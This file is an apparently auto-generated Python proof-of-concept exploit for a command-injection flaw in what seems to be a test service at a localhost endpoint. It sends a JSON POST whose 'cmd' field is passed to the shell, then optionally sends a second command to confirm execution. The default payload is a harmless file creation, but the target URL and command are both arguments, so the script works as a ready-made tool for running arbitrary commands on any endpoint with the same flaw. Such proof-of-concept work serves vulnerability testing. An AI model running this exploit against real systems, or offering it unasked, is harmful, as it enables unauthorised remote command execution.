#!/usr/bin/env python3
# PoC for allpaths_test_p8irs888 (/tmp/allpaths_test_p8irs888)
# Path: rce-000
# Sink: run_cmd
# Auto-generated — run with: python3 rce_allows_arbitrary_command_execution_run_cmd.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit Script for allpaths_test_p8irs888
Vulnerability: Command Injection (RCE) via 'cmd' parameter
Target: /tmp/allpaths_test_p8irs888 simulated API endpoint

The vulnerable code extracts the 'cmd' parameter from user input and passes it
directly to os.system() without sanitization, allowing arbitrary command execution.

Usage:
    python3 exploit.py [--target http://localhost:8080/api/v1/trigger]
    
Default payload: touch /tmp/poc_success.txt (benign)
"""

import argparse
import sys
import urllib.request
import urllib.parse
import urllib.error
import json

def exploit(target_url, cmd_payload):
    """
    Sends a malicious request to the vulnerable endpoint.
    
    Args:
        target_url: The full URL of the vulnerable endpoint
        cmd_payload: The command to execute on the target
    
    Returns:
        Tuple of (success: bool, response_text: str)
    """
    # Prepare the POST data with the malicious command
    # The vulnerable code expects a JSON-like request object with 'cmd' key
    post_data = json.dumps({"cmd": cmd_payload}).encode('utf-8')
    
    # Create request with proper headers
    req = urllib.request.Request(
        target_url,
        data=post_data,
        headers={
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (PoC Exploit)'
        },
        method='POST'
    )
    
    try:
        # Send the request with a timeout
        with urllib.request.urlopen(req, timeout=10) as response:
            response_text = response.read().decode('utf-8')
            status_code = response.getcode()
            
            print(f"[+] HTTP Status: {status_code}")
            print(f"[+] Response: {response_text[:500]}...")  # Truncate long responses
            
            # Check if our command likely executed (status 200 usually means success)
            if status_code == 200:
                return True, response_text
            else:
                return False, response_text
                
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        return False, str(e)
    except urllib.error.URLError as e:
        print(f"[-] URL Error: {e.reason}")
        return False, str(e)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False, str(e)

def main():
    parser = argparse.ArgumentParser(
        description="PoC Exploit for allpaths_test_p8irs888 Command Injection"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080/api/v1/trigger",
        help="Target URL (default: http://localhost:8080/api/v1/trigger)"
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt - benign)"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="After exploitation, try to verify command execution (e.g., check file existence)"
    )
    
    args = parser.parse_args()
    
    print("[*] allpaths_test_p8irs888 Command Injection PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {args.cmd}")
    print("[*] Attempting exploitation...")
    
    success, response = exploit(args.target, args.cmd)
    
    if success:
        print("[+] Exploit appears successful!")
        print(f"[+] Full response: {response}")
        
        # Optional verification step
        if args.verify:
            print("[*] Attempting to verify command execution...")
            # Try to read /tmp/poc_success.txt if that was our payload
            if "touch /tmp/poc_success.txt" in args.cmd:
                verify_cmd = "cat /tmp/poc_success.txt 2>&1 || echo 'File not found'"
                print(f"[*] Verification command: {verify_cmd}")
                v_success, v_response = exploit(args.target, verify_cmd)
                if v_success:
                    print(f"[+] Verification response: {v_response}")
                else:
                    print("[-] Verification failed")
    else:
        print("[-] Exploit failed")
        print("[*] Possible reasons:")
        print("  - Target is not running or not accessible")
        print("  - Endpoint path is different")
        print("  - Input format differs (try different Content-Type)")
        print("  - Some form of WAF/input filtering is present")
        sys.exit(1)

if __name__ == "__main__":
    main()
